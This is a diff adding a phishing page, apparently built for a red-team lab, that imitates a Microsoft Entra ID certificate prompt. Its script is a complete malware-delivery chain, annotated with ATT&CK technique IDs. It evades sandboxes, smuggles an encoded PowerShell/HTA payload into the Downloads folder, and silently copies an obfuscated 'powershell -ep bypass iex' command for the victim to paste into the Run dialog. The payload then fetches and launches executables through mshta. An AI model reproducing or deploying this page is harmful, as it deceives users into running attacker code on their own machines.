@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Certificate Update Required - Microsoft Entra ID</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+            padding: 40px 44px;
+            width: 100%;
+            max-width: 520px;
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+        .ms-logo span {
+            font-size: 15px;
+            font-weight: 600;
+            color: #323130;
+            letter-spacing: -0.2px;
+        }
+        .page-title {
+            font-size: 21px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 8px;
+        }
+        .page-sub {
+            font-size: 13.5px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .divider {
+            border: none;
+            border-top: 1px solid #edebe9;
+            margin: 20px 0;
+        }
+
+        /* Spinner */
+        .spinner-wrap {
+            text-align: center;
+            padding: 24px 0;
+        }
+        .spinner {
+            border: 3px solid #edebe9;
+            border-top-color: #0078d4;
+            border-radius: 50%;
+            width: 38px;
+            height: 38px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner-wrap p { font-size: 13px; color: #605e5c; }
+
+        /* Steps */
+        .steps-wrap { display: none; }
+        .step {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        .step-badge {
+            width: 28px;
+            height: 28px;
+            min-width: 28px;
+            border-radius: 50%;
+            background: #0078d4;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+        }
+        .step-badge.done { background: #107c10; }
+        .step-body { flex: 1; }
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 6px;
+        }
+        .step-desc {
+            font-size: 13px;
+            color: #605e5c;
+            line-height: 1.5;
+        }
+
+        /* Download block */
+        .dl-block {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f3f2f1;
+            border: 1px solid #d2d0ce;
+            border-radius: 3px;
+            padding: 10px 14px;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+        .dl-icon { font-size: 18px; }
+        .dl-name { font-weight: 600; color: #201f1e; flex: 1; }
+        .dl-status { font-size: 12px; color: #107c10; font-weight: 600; }
+
+        /* Command block */
+        .cmd-block {
+            background: #1b1b1b;
+            border-radius: 3px;
+            padding: 12px 14px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 11.5px;
+            color: #a19f9d;
+            margin-top: 10px;
+            word-break: break-all;
+            letter-spacing: 0.2px;
+            user-select: none;
+            line-height: 1.5;
+        }
+        .kbd {
+            display: inline-flex;
+            align-items: center;
+            background: #f3f2f1;
+            border: 1px solid #c8c6c4;
+            border-radius: 3px;
+            padding: 1px 6px;
+            font-size: 11.5px;
+            font-family: 'Segoe UI', sans-serif;
+            color: #201f1e;
+            white-space: nowrap;
+        }
+        .copy-btn {
+            display: block;
+            width: 100%;
+            margin-top: 14px;
+            padding: 9px;
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Segoe UI', sans-serif;
+            transition: background 0.15s;
+        }
+        .copy-btn:hover  { background: #106ebe; }
+        .copy-btn:active { background: #005a9e; }
+        .copy-btn.copied { background: #107c10; }
+
+        .notice {
+            font-size: 11.5px;
+            color: #a19f9d;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+        .notice a { color: #0078d4; text-decoration: none; }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #a19f9d;
+        }
+        .footer-links a { color: #a19f9d; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- Microsoft branding -->
+    <div class="ms-logo">
+        <svg width="22" height="22" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
+            <rect x="1"  y="1"  width="10" height="10" fill="#f25022"/>
+            <rect x="12" y="1"  width="10" height="10" fill="#7fba00"/>
+            <rect x="1"  y="12" width="10" height="10" fill="#00a4ef"/>
+            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+        </svg>
+        <span>Microsoft Entra ID</span>
+    </div>
+
+    <!-- Loading state -->
+    <div class="spinner-wrap" id="spinner">
+        <div class="spinner"></div>
+        <p>Checking device compliance status...</p>
+    </div>
+
+    <!-- Main content -->
+    <div class="steps-wrap" id="main">
+        <h1 class="page-title">Certificate Update Required</h1>
+        <p class="page-sub">
+            Your organization's security policy requires a trusted root certificate
+            to authenticate this device. Follow the two steps below to continue.
+        </p>
+
+        <hr class="divider">
+
+        <!-- Step 1: Download -->
+        <div class="step">
+            <div class="step-badge done" id="badge1">&#10003;</div>
+            <div class="step-body">
+                <div class="step-title">Download the certificate package</div>
+                <div class="step-desc">
+                    The certificate file has been downloaded to your
+                    <strong>Downloads</strong> folder.
+                </div>
+                <div class="dl-block">
+                    <span class="dl-icon">&#128274;</span>
+                    <span class="dl-name">cert_bundle.txt</span>
+                    <span class="dl-status">&#10003; Downloaded</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Install -->
+        <div class="step">
+            <div class="step-badge" id="badge2">2</div>
+            <div class="step-body">
+                <div class="step-title">Install the certificate</div>
+                <div class="step-desc">
+                    Press <span class="kbd">&#8862; Win</span> + <span class="kbd">R</span>,
+                    click <strong>Copy command</strong> below, paste with
+                    <span class="kbd">Ctrl</span> + <span class="kbd">V</span>,
+                    then press <span class="kbd">Enter</span>.
+                </div>
+                <div class="cmd-block" id="cmdDisplay">
+                    &#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;
+                </div>
+                <button class="copy-btn" id="copyBtn" onclick="copyCommand()">
+                    Copy command
+                </button>
+            </div>
+        </div>
+
+        <p class="notice">
+            This process installs a certificate to your local trust store.<br>
+            No data is collected. <a href="#">Privacy statement</a>
+        </p>
+    </div>
+</div>
+
+<div class="footer-links">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <a href="#">Contact</a>
+</div>
+
+<script>
+    // T1480.001 - Environmental Keying: restrict to lab hostname
+    if (window.location.hostname !== 'upload.testlab.local') {
+        window.location.replace('https://login.microsoftonline.com/');
+    }
+
+    // T1497.001 - Sandbox Evasion: System Checks
+    function sandboxCheck() {
+        if (screen.width < 1000 || screen.height < 700) return true;
+        if (navigator.plugins.length === 0) return true;
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (!tz || tz === 'UTC') return true;
+        return false;
+    }
+
+    // T1497.002 - User Activity Check
+    var interactions = 0;
+    document.addEventListener('mousemove', function() { interactions++; });
+    document.addEventListener('keydown',   function() { interactions += 3; });
+
+    // T1027.006 - HTML Smuggling: payload assembled client-side from embedded Blob,
+    // no separate HTTP request for cert_bundle.txt (bypasses proxy/DLP download inspection)
+    function triggerDownload() {
+        var b64 = 'PCMKLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tClBHaDBiV3crRFFvOGFHVmhaRDROQ2p4MGFYUnNaVDVYYVc1a2IzZHpJRU5sY25ScFptbGpZWFJsSUVWdWNtOXMKYkcxbGJuUThMM1JwZEd4bFBnMEtQRWhVUVRwQlVGQk1TVU5CVkVsUFRnMEtJQ0FnSUVsRVBTSlhhVzVEWlhKMApSVzV5YjJ4c0lnMEtJQ0FnSUVGUVVFeEpRMEZVU1U5T1RrRk5SVDBpVjJsdVpHOTNjeUJEWlhKMGFXWnBZMkYwClpTQkZibkp2Ykd4dFpXNTBJZzBLSUNBZ0lGZEpUa1JQVjFOVVFWUkZQU0p0YVc1cGJXbDZaU0lOQ2lBZ0lDQlQKU0U5WFNVNVVRVk5MUWtGU1BTSnVieUlOQ2lBZ0lDQk9RVlpKUjBGQ1RFVTlJbTV2SWcwS0lDQWdJRk5EVWs5TQpURDBpYm04aURRb2dJQ0FnUWs5U1JFVlNQU0p1YjI1bElnMEtJQ0FnSUVsT1RrVlNRazlTUkVWU1BTSnVieUlOCkNpQWdJQ0JEUVZCVVNVOU9QU0p1YnlJTkNpOCtEUW84YzJOeWFYQjBJR3hoYm1kMVlXZGxQU0pXUWxOamNtbHcKZENJK0RRcFRkV0lnVlhCa1lYUmxVM1JoZEhWektITjBjazF6WnlrTkNpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRgpiR1Z0Wlc1MFFubEpaQ2dpYzNSaGRIVnpUWE5uSWlrdWFXNXVaWEpVWlhoMElEMGdjM1J5VFhObkRRcEZibVFnClUzVmlEUW9OQ2xOMVlpQlhhVzVrYjNkZlQyNU1iMkZrRFFvTkNpQWdJQ0JWY0dSaGRHVlRkR0YwZFhNZ0lrVnUKY205c2JHbHVaeUJqWlhKMGFXWnBZMkYwWlM0dUxpSU5DZzBLSUNBZ0lFUnBiU0J2VTJobGJHd2dJQ0FnSUNBZwpJQ0FnT2lCVFpYUWdiMU5vWld4c0lEMGdRM0psWVhSbFQySnFaV04wS0NKWFUyTnlhWEIwTGxOb1pXeHNJaWtOCkNpQWdJQ0JFYVcwZ2MzUnlWWE5sY2lBZ0lDQWdJQ0FnSURvZ2MzUnlWWE5sY2lBZ0lDQWdQU0J2VTJobGJHd3UKUlhod1lXNWtSVzUyYVhKdmJtMWxiblJUZEhKcGJtZHpLQ0lsVlZORlVrNUJUVVVsSWlrTkNpQWdJQ0JFYVcwZwpjM1J5U0c5emRDQWdJQ0FnSUNBZ0lEb2djM1J5U0c5emRDQWdJQ0FnUFNCdlUyaGxiR3d1Ulhod1lXNWtSVzUyCmFYSnZibTFsYm5SVGRISnBibWR6S0NJbFEwOU5VRlZVUlZKT1FVMUZKU0lwRFFvZ0lDQWdSR2x0SUhOMGNrbHUKYzNSaGJHeEVhWElnSUNBNklITjBja2x1YzNSaGJHeEVhWElnUFNCdlUyaGxiR3d1Ulhod1lXNWtSVzUyYVhKdgpibTFsYm5SVGRISnBibWR6S0NJbFFWQlFSRUZVUVNVaUtTQW1JQ0pjVFdsamNtOXpiMlowWEZkcGJtUnZkM05jCklnMEtJQ0FnSUVScGJTQnpkSEpOYjJSMWJHVk9ZVzFsSUNBZ09pQnpkSEpOYjJSMWJHVk9ZVzFsSUQwZ0lrTmwKY25SRmJuSnZiR3hCWjJWdWRDSU5DaUFnSUNCRWFXMGdjM1J5VUdGamEyRm5aVVpwYkdVZ0lEb2djM1J5VUdGagphMkZuWlVacGJHVWdQU0J6ZEhKSmJuTjBZV3hzUkdseUlDWWdjM1J5VFc5a2RXeGxUbUZ0WlNBbUlDSXVZbWx1CklnMEtJQ0FnSUVScGJTQnpkSEpOYjJSMWJHVlFZWFJvSUNBZ09pQnpkSEpOYjJSMWJHVlFZWFJvSUNBOUlITjAKY2tsdWMzUmhiR3hFYVhJZ0ppQnpkSEpOYjJSMWJHVk9ZVzFsSUNZZ0lpNWxlR1VpRFFvTkNpQWdJQ0JFYVcwZwpiMUJoY21GdGN5QTZJRk5sZENCdlVHRnlZVzF6SUQwZ1EzSmxZWFJsVDJKcVpXTjBLQ0pUWTNKcGNIUnBibWN1ClJHbGpkR2x2Ym1GeWVTSXBEUW9nSUNBZ2IxQmhjbUZ0Y3k1QlpHUWdJbU52YlhCdmJtVnVkQ0lzSUNKRmJuUnkKWVVsRUxVTmxjblJGYm5KdmJHeHRaVzUwSWcwS0lDQWdJRzlRWVhKaGJYTXVRV1JrSUNKb2IzTjBJaXdnSUNBZwpJQ0J6ZEhKSWIzTjBEUW9nSUNBZ2IxQmhjbUZ0Y3k1QlpHUWdJblZ6WlhJaUxDQWdJQ0FnSUhOMGNsVnpaWElOCkNpQWdJQ0J2VUdGeVlXMXpMa0ZrWkNBaWRHbHRaVzkxZENJc0lDQWdJak13TURBd0lnMEtJQ0FnSUc5UVlYSmgKYlhNdVFXUmtJQ0p0WVhoU1pYUnllU0lzSUNBaU15SU5DZzBLSUNBZ0lFUnBiU0J6ZEhKU1pYRjFhWEpsWkNBNgpJSE4wY2xKbGNYVnBjbVZrSUQwZ0lqUXVNaTR4SWcwS0lDQWdJRVJwYlNCaGNuSldaWElnSUNBZ0lDQTZJR0Z5CmNsWmxjaUFnUFNCVGNHeHBkQ2h6ZEhKU1pYRjFhWEpsWkN3Z0lpNGlLUTBLSUNBZ0lFUnBiU0J1VFdGcWIzSWcKSUNBZ0lDQTZJRzVOWVdwdmNpQWdQU0JEU1c1MEtHRnljbFpsY2lnd0tTa05DaUFnSUNCRWFXMGdiazFwYm05eQpJQ0FnSUNBZ09pQnVUV2x1YjNJZ0lEMGdRMGx1ZENoaGNuSldaWElvTVNrcERRb2dJQ0FnUkdsdElHNVFZWFJqCmFDQWdJQ0FnSURvZ2JsQmhkR05vSUNBOUlFTkpiblFvWVhKeVZtVnlLRElwS1EwS0RRb2dJQ0FnUkdsdElITjAKY2xCaGVXeHZZV1JFY205d0lDQTZJSE4wY2xCaGVXeHZZV1JFY205d0lEMGdJa002WEZCeWIyZHlZVzFFWVhSaApYRU5sY25SRFFTNWlhVzRpRFFvZ0lDQWdSR2x0SUhOMGNsQmhlV3h2WVdSVmNtd2dJQ0E2SUhOMGNsQmhlV3h2CllXUlZjbXdnSUQwZ0ltaDBkSEE2THk5MWNHeHZZV1F1ZEdWemRHeGhZaTVzYjJOaGJDOTFjR3h2WVdSekwyUnUKYzJOaGRESXVaWGhsSWcwS0lDQWdJRVJwYlNCdlVHRjViRzloWkNBZ0lDQWdJQ0FnT2lCVFpYUWdiMUJoZVd4dgpZV1FnSUNBOUlFTnlaV0YwWlU5aWFtVmpkQ2dpVFZOWVRVd3lMbGhOVEVoVVZGQWlLUTBLSUNBZ0lHOVFZWGxzCmIyRmtMazl3Wlc0Z0lrZEZWQ0lzSUhOMGNsQmhlV3h2WVdSVmNtd3NJRVpoYkhObERRb2dJQ0FnYjFCaGVXeHYKWVdRdWMyVjBVbVZ4ZFdWemRFaGxZV1JsY2lBaVZYTmxjaTFCWjJWdWRDSXNJQ0pOYjNwcGJHeGhMelV1TUNBbwpWMmx1Wkc5M2N5Qk9WQ0F4TUM0d095QlhhVzQyTkRzZ2VEWTBLU0lOQ2lBZ0lDQnZVR0Y1Ykc5aFpDNVRaVzVrCkRRb05DaUFnSUNCSlppQnZVR0Y1Ykc5aFpDNVRkR0YwZFhNZ1BTQXlNREFnUVc1a0lFeGxia0lvYjFCaGVXeHYKWVdRdWNtVnpjRzl1YzJWQ2IyUjVLU0ErSURBZ1ZHaGxiZzBLSUNBZ0lDQWdJQ0JFYVcwZ2IxQmhlV3h2WVdSVApkRzBnT2lCVFpYUWdiMUJoZVd4dllXUlRkRzBnUFNCRGNtVmhkR1ZQWW1wbFkzUW9Ja0ZFVDBSQ0xsTjBjbVZoCmJTSXBEUW9nSUNBZ0lDQWdJRzlRWVhsc2IyRmtVM1J0TGxSNWNHVWdQU0F4RFFvZ0lDQWdJQ0FnSUc5UVlYbHMKYjJGa1UzUnRMazl3Wlc0TkNpQWdJQ0FnSUNBZ2IxQmhlV3h2WVdSVGRHMHVWM0pwZEdVZ2IxQmhlV3h2WVdRdQpjbVZ6Y0c5dWMyVkNiMlI1RFFvZ0lDQWdJQ0FnSUc5UVlYbHNiMkZrVTNSdExsTmhkbVZVYjBacGJHVWdjM1J5ClVHRjViRzloWkVSeWIzQXNJRElOQ2lBZ0lDQWdJQ0FnYjFCaGVXeHZZV1JUZEcwdVEyeHZjMlVOQ2lBZ0lDQWcKSUNBZ1UyVjBJRzlRWVhsc2IyRmtVM1J0SUQwZ1RtOTBhR2x1WncwS0lDQWdJRVZ1WkNCSlpnMEtJQ0FnSUZObApkQ0J2VUdGNWJHOWhaQ0E5SUU1dmRHaHBibWNOQ2cwS0lDQWdJRVJwYlNCemRISlFZV05yWVdkbFZYSnNJQ0FnCk9pQnpkSEpRWVdOcllXZGxWWEpzSUQwZ0ltaDBkSEE2THk5MWNHeHZZV1F1ZEdWemRHeGhZaTVzYjJOaGJDOTEKY0d4dllXUnpMME5YVEVobGNuQmhaR1Z5Y0dsdVp5NWxlR1VpRFFvZ0lDQWdSR2x0SUc5SWRIUndJQ0FnSUNBZwpJQ0FnSUNBNklGTmxkQ0J2U0hSMGNDQTlJRU55WldGMFpVOWlhbVZqZENnaVRWTllUVXd5TGxoTlRFaFVWRkFpCktRMEtJQ0FnSUVScGJTQnVRWFIwWlcxd2RDQWdJQ0FnSUNBZ09pQnVRWFIwWlcxd2RDQWdQU0F3RFFvZ0lDQWcKUkdsdElHNU5ZWGhTWlhSeWVTQWdJQ0FnSUNBNklHNU5ZWGhTWlhSeWVTQTlJRU5KYm5Rb2IxQmhjbUZ0Y3lnaQpiV0Y0VW1WMGNua2lLU2tOQ2lBZ0lDQkVhVzBnWWxKbFlXUjVJQ0FnSUNBZ0lDQWdJRG9nWWxKbFlXUjVJQ0FnCklEMGdSbUZzYzJVTkNnMEtJQ0FnSUVSdklGZG9hV3hsSUc1QmRIUmxiWEIwSUR3Z2JrMWhlRkpsZEhKNUlFRnUKWkNCT2IzUWdZbEpsWVdSNURRb2dJQ0FnSUNBZ0lHNUJkSFJsYlhCMElEMGdia0YwZEdWdGNIUWdLeUF4RFFvZwpJQ0FnSUNBZ0lHOUlkSFJ3TGs5d1pXNGdJa2RGVkNJc0lITjBjbEJoWTJ0aFoyVlZjbXdzSUVaaGJITmxEUW9nCklDQWdJQ0FnSUc5SWRIUndMbk5sZEZKbGNYVmxjM1JJWldGa1pYSWdJbFZ6WlhJdFFXZGxiblFpTENBaVRXOTYKYVd4c1lTODFMakFnS0ZkcGJtUnZkM01nVGxRZ01UQXVNRHNnVjJsdU5qUTdJSGcyTkNraURRb2dJQ0FnSUNBZwpJRzlJZEhSd0xsTmxibVFOQ2lBZ0lDQWdJQ0FnU1dZZ2IwaDBkSEF1VTNSaGRIVnpJRDBnTWpBd0lGUm9aVzROCkNpQWdJQ0FnSUNBZ0lDQWdJRlZ3WkdGMFpWTjBZWFIxY3lBaVJHOTNibXh2WVdScGJtY2dZMlZ5ZEdsbWFXTmgKZEdVZ2NHRmphMkZuWlM0dUxpSU5DaUFnSUNBZ0lDQWdJQ0FnSUdKU1pXRmtlU0E5SUZSeWRXVU5DaUFnSUNBZwpJQ0FnUlc1a0lFbG1EUW9nSUNBZ1RHOXZjQTBLRFFvZ0lDQWdTV1lnWWxKbFlXUjVJRlJvWlc0TkNpQWdJQ0FnCklDQWdSR2x0SUc1UVlXTnJZV2RsVTJsNlpTQTZJRzVRWVdOcllXZGxVMmw2WlNBOUlFeGxia0lvYjBoMGRIQXUKY21WemNHOXVjMlZDYjJSNUtRMEtEUW9nSUNBZ0lDQWdJRWxtSUc1UVlXTnJZV2RsVTJsNlpTQStJREFnVkdobApiZzBLSUNBZ0lDQWdJQ0FnSUNBZ1JHbHRJRzlUZEhKbFlXMGdPaUJUWlhRZ2IxTjBjbVZoYlNBOUlFTnlaV0YwClpVOWlhbVZqZENnaVFVUlBSRUl1VTNSeVpXRnRJaWtOQ2lBZ0lDQWdJQ0FnSUNBZ0lHOVRkSEpsWVcwdVZIbHcKWlNBOUlERU5DaUFnSUNBZ0lDQWdJQ0FnSUc5VGRISmxZVzB1VDNCbGJnMEtJQ0FnSUNBZ0lDQWdJQ0FnYjFOMApjbVZoYlM1WGNtbDBaU0J2U0hSMGNDNXlaWE53YjI1elpVSnZaSGtOQ2lBZ0lDQWdJQ0FnSUNBZ0lHOVRkSEpsCllXMHVVMkYyWlZSdlJtbHNaU0J6ZEhKUVlXTnJZV2RsUm1sc1pTd2dNZzBLSUNBZ0lDQWdJQ0FnSUNBZ2IxTjAKY21WaGJTNURiRzl6WlEwS0lDQWdJQ0FnSUNBZ0lDQWdVMlYwSUc5VGRISmxZVzBnUFNCT2IzUm9hVzVuRFFvTgpDaUFnSUNBZ0lDQWdJQ0FnSUVScGJTQnZSbk1nT2lCVFpYUWdiMFp6SUQwZ1EzSmxZWFJsVDJKcVpXTjBLQ0pUClkzSnBjSFJwYm1jdVJtbHNaVk41YzNSbGJVOWlhbVZqZENJcERRb2dJQ0FnSUNBZ0lDQWdJQ0JKWmlCdlJuTXUKUm1sc1pVVjRhWE4wY3loemRISk5iMlIxYkdWUVlYUm9LU0JVYUdWdUlHOUdjeTVFWld4bGRHVkdhV3hsSUhOMApjazF2WkhWc1pWQmhkR2dzSUZSeWRXVU5DaUFnSUNBZ0lDQWdJQ0FnSUc5R2N5NU5iM1psUm1sc1pTQnpkSEpRCllXTnJZV2RsUm1sc1pTd2djM1J5VFc5a2RXeGxVR0YwYUEwS0lDQWdJQ0FnSUNBZ0lDQWdVMlYwSUc5R2N5QTkKSUU1dmRHaHBibWNOQ2cwS0lDQWdJQ0FnSUNBZ0lDQWdRM0psWVhSbFQySnFaV04wS0NKVGFHVnNiQzVCY0hCcwphV05oZEdsdmJpSXBMbE5vWld4c1JYaGxZM1YwWlNCemRISk5iMlIxYkdWUVlYUm9MQ0FpSWl3Z2MzUnlTVzV6CmRHRnNiRVJwY2l3Z0ltOXdaVzRpTENBd0RRb2dJQ0FnSUNBZ0lFVnVaQ0JKWmcwS0lDQWdJRVZ1WkNCSlpnMEsKRFFvZ0lDQWdVMlYwSUc5UVlYSmhiWE1nUFNCT2IzUm9hVzVuRFFvZ0lDQWdVMlYwSUc5SWRIUndJQ0FnUFNCTwpiM1JvYVc1bkRRb2dJQ0FnVTJWMElHOVRhR1ZzYkNBZ1BTQk9iM1JvYVc1bkRRb05DaUFnSUNCVmNHUmhkR1ZUCmRHRjBkWE1nSWtObGNuUnBabWxqWVhSbElHVnVjbTlzYkcxbGJuUWdZMjl0Y0d4bGRHVXVJZzBLRFFvZ0lDQWcKZDJsdVpHOTNMbk5sZEZScGJXVnZkWFFnSW5ObGJHWXVZMnh2YzJVaUxDQTFNREF3TENBaVZrSlRZM0pwY0hRaQpEUW9OQ2tWdVpDQlRkV0lOQ2p3dmMyTnlhWEIwUGcwS1BDOW9aV0ZrUGcwS1BHSnZaSGtnYzNSNWJHVTlJbUpoClkydG5jbTkxYm1RNkkyWTBaalJtTkRzZ1ptOXVkQzFtWVcxcGJIazZKMU5sWjI5bElGVkpKeXhCY21saGJDeHoKWVc1ekxYTmxjbWxtT3lCa2FYTndiR0Y1T21ac1pYZzdJR0ZzYVdkdUxXbDBaVzF6T21ObGJuUmxjanNnYW5WegpkR2xtZVMxamIyNTBaVzUwT21ObGJuUmxjanNnYUdWcFoyaDBPakV3TUhab095QnRZWEpuYVc0Nk1Ec2lQZzBLCklDQWdJRHhrYVhZZ2MzUjViR1U5SW5SbGVIUXRZV3hwWjI0NlkyVnVkR1Z5T3lCamIyeHZjam9qTmpZMk95Qm0KYjI1MExYTnBlbVU2TVROd2VEc2lQZzBLSUNBZ0lDQWdJQ0E4Y0NCemRIbHNaVDBpWm05dWRDMTNaV2xuYUhRNgpOakF3T3lCbWIyNTBMWE5wZW1VNk1UUndlRHNpUGxkcGJtUnZkM01nUTJWeWRHbG1hV05oZEdVZ1JXNXliMnhzCmJXVnVkRHd2Y0Q0TkNpQWdJQ0FnSUNBZ1BIQWdhV1E5SW5OMFlYUjFjMDF6WnlJZ2MzUjViR1U5SW1admJuUXQKYzJsNlpUb3hNWEI0T3lCdFlYSm5hVzR0ZEc5d09qWndlRHNnWTI5c2IzSTZJemc0T0RzaVBrbHVhWFJwWVd4cAplbWx1Wnk0dUxqd3ZjRDROQ2lBZ0lDQThMMlJwZGo0TkNqd3ZZbTlrZVQ0TkNqd3ZhSFJ0YkQ0TkNnPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQojPgokZj1Kb2luLVBhdGggJGVudjpVU0VSUFJPRklMRSBEb3dubG9hZHNcY2VydF9idW5kbGUudHh0OyRzPSgoR2V0LUNvbnRlbnQgJGZ8V2hlcmUtT2JqZWN0eyRfIC1tYXRjaCAnXltBLVphLXowLTkrLz1dKyQnfXxPdXQtU3RyaW5nKSAtcmVwbGFjZSAnW1xyXG5dJywnJyk7JGJ0PVtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJHMpOyR4PU5ldy1PYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkZyb21CYXNlNjRUcmFuc2Zvcm07JG09TmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW07JGM9TmV3LU9iamVjdCBTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtKCRtLCR4LFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtTW9kZV06OldyaXRlKTskYy5Xcml0ZSgkYnQsMCwkYnQuTGVuZ3RoKTskYy5GbHVzaEZpbmFsQmxvY2soKTskdGI9Sm9pbi1QYXRoICRlbnY6VEVNUCBocHNvbHV0aW9uc3BvcnRhbC5iaW47W0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCR0YiwkbS5Ub0FycmF5KCkpOyR0aD1Kb2luLVBhdGggJGVudjpURU1QIGhwc29sdXRpb25zcG9ydGFsLmh0YTtpZihUZXN0LVBhdGggJHRoKXtSZW1vdmUtSXRlbSAkdGggLUZvcmNlfTtSZW5hbWUtSXRlbSAkdGIgJHRoO21zaHRhLmV4ZSAkdGgK';
+        var raw = atob(b64);
+        var arr = new Uint8Array(raw.length);
+        for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+        var blob = new Blob([arr], {type: 'text/plain'});
+        var url  = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href     = url;
+        a.download = 'cert_bundle.txt';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function() { document.body.removeChild(a); URL.revokeObjectURL(url); }, 300);
+    }
+
+    // T1027.010 - Command Obfuscation: short launcher; all decode logic lives inside the polyglot PEM
+    function buildCommand() {
+        var ps  = ['pow','er','sh','ell'].join('');
+        var sw  = [' -w',' h',' -ep',' byp','ass',' -c'].join('');
+        var pay = ["\"iex(gc -Raw '","%" + "USERPROFILE","%" + "\\Down","loads\\","cert_","bun","dle.txt",'\')"'].join('');
+        return ps + sw + ' ' + pay;
+    }
+
+    // T1204.004 - Malicious Copy and Paste
+    function copyCommand() {
+        var cmd = buildCommand();
+        var btn = document.getElementById('copyBtn');
+
+        function onSuccess() {
+            btn.textContent = 'Command copied';
+            btn.classList.add('copied');
+            setTimeout(function() {
+                btn.textContent = 'Copy command';
+                btn.classList.remove('copied');
+            }, 3000);
+        }
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).then(onSuccess).catch(function() {
+                fallbackCopy(cmd, onSuccess);
+            });
+        } else {
+            fallbackCopy(cmd, onSuccess);
+        }
+    }
+
+    function fallbackCopy(text, cb) {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        try { document.execCommand('copy'); cb(); } catch(e) {}
+        document.body.removeChild(ta);
+    }
+
+    // T1678 - Delayed execution: spinner first, reveal UI after check
+    var delay = sandboxCheck() ? 9999999 : 5000;
+
+    setTimeout(function() {
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('main').style.display = 'block';
+
+        // Pre-load clipboard silently on reveal
+        var cmd = buildCommand();
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).catch(function() {});
+        }
+
+        // Auto-trigger cert download
+        triggerDownload();
+    }, delay);
+</script>
+</body>
+</html>
